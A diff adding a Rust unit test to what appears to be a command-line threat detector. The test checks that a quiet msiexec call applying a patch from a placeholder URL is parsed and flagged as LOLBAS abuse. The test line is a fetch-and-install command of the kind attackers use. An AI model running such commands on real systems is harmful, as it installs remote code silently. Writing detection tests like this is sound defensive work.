@@ -9577,6 +9577,35 @@ mod msiexec_tests {
     }
 
     #[test]
+    fn msiexec_patch_url_emits_typed_trait() {
+        let mut env = Environment::new(&Config::default());
+        interpret_line(
+            r#"msiexec /quiet /p "https://msiexec-patch.example/update.msp""#,
+            &mut env,
+        );
+        let has = env.traits.iter().any(|t| {
+            matches!(
+                t,
+                Trait::UrlArgument { url, .. }
+                    if url == "https://msiexec-patch.example/update.msp"
+            )
+        });
+        assert!(
+            has,
+            "msiexec patch URL argument not typed: {:?}",
+            env.traits
+        );
+        let has_lolbas = env.traits.iter().any(
+            |t| matches!(t, Trait::Lolbas { name, cmd } if name == "msiexec" && cmd.contains("/p")),
+        );
+        assert!(
+            has_lolbas,
+            "msiexec patch URL not marked as LOLBAS: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
     fn msiexec_schemeless_package_url_emits_typed_trait() {
         let mut env = Environment::new(&Config::default());
         interpret_line(
